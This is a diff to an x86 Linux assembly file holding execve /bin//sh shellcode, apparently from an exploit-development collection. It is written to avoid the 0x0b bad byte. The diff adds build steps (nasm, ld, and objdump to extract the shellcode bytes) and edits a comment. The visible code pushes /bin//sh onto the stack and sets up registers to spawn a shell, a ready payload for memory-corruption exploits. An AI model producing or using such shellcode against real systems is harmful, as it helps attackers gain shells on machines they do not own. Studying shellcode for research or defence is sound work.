@@ -1,3 +1,8 @@
+; To create the binary
+; nasm -f elf32 linux_x86_execve_no_whitespace.asm -o sc.o
+; ld sc.o -o sc
+
+; Use objdump or some other tool to extract shellcode from sc binary!
 
 ; /bin//sh execve shellcode by @Pink_P4nther.
 ; The point of this shellcode is to bypass when 0x0b (11) is a bad byte.
@@ -15,7 +20,7 @@ _start:
 	push eax ; Put 0 on the stack
 	push 0x68732f2f ; Push //sh on the stack
 	push 0x6e69622f ; Push /bin on the stack
-	mov ebx,esp ; Move /bin//sh into ebx
+	mov ebx,esp ; Move /bin//sh\0 into ebx
 	xor ecx,ecx ; Zero ecx
 	mov edx,ecx ; Move zero into edx
 	mov eax,0xffffffff ; Move max 32 bit unsigned integer into eax
